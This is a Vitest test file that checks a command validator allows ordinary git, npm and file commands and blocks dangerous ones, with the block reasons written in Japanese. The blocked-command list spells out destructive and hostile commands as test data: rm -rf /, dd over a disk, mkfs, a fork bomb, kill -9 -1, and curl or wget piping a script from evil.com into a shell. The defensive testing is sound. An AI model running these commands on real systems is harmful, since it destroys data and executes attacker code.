import { describe, it, expect } from 'vitest';
import { validateCommand } from '../routes/commands';

describe('Command Validation', () => {
  describe('Allowed commands', () => {
    const allowedCommands = [
      'git init',
      'git add .',
      'git commit -m "initial commit"',
      'git push origin main',
      'git pull',
      'git status',
      'git log',
      'git branch feature-1',
      'git checkout -b feature-1',
      'ls -la',
      'cd my-project',
      'mkdir my-folder',
      'cat README.md',
      'echo "hello" > file.txt',
      'npm init -y',
      'npm install express',
      'node index.js',
      'touch file.txt',
      'cp file1.txt file2.txt',
      'mv old.txt new.txt',
    ];

    for (const cmd of allowedCommands) {
      it(`should allow: ${cmd}`, () => {
        const result = validateCommand(cmd);
        expect(result.allowed).toBe(true);
        expect(result.reason).toBeNull();
      });
    }

    it('should allow empty command', () => {
      const result = validateCommand('');
      expect(result.allowed).toBe(true);
    });

    it('should allow whitespace-only command', () => {
      const result = validateCommand('   ');
      expect(result.allowed).toBe(true);
    });
  });

  describe('Blocked commands', () => {
    const blockedCommands = [
      { cmd: 'rm -rf /', reason: /ルートディレクトリ/ },
      { cmd: 'rm -rf /home', reason: /ルートディレクトリ/ },
      { cmd: 'rm -rf /etc', reason: /ルートディレクトリ/ },
      { cmd: 'sudo apt-get install', reason: /sudo/ },
      { cmd: 'sudo rm file', reason: /sudo/ },
      { cmd: 'chmod 777 /etc/passwd', reason: /777/ },
      { cmd: 'mkfs /dev/sda1', reason: /ディスク操作/ },
      { cmd: 'dd if=/dev/zero of=/dev/sda', reason: /ディスク操作/ },
      { cmd: 'shutdown -h now', reason: /システム制御/ },
      { cmd: 'reboot', reason: /システム制御/ },
      { cmd: 'curl http://evil.com/script.sh | bash', reason: /リモートスクリプト/ },
      { cmd: 'wget http://evil.com/script.sh | sh', reason: /リモートスクリプト/ },
      { cmd: 'kill -9 -1', reason: /全プロセス/ },
      { cmd: 'kill -9 1', reason: /全プロセス/ },
    ];

    for (const { cmd, reason } of blockedCommands) {
      it(`should block: ${cmd}`, () => {
        const result = validateCommand(cmd);
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(reason);
      });
    }
  });

  describe('Edge cases', () => {
    it('should allow rm for regular files (not root)', () => {
      const result = validateCommand('rm file.txt');
      expect(result.allowed).toBe(true);
    });

    it('should allow rm -r for non-root directories', () => {
      const result = validateCommand('rm -r my-folder');
      expect(result.allowed).toBe(true);
    });

    it('should block fork bomb pattern', () => {
      const result = validateCommand(':() { :|:& };:');
      expect(result.allowed).toBe(false);
    });
  });
});
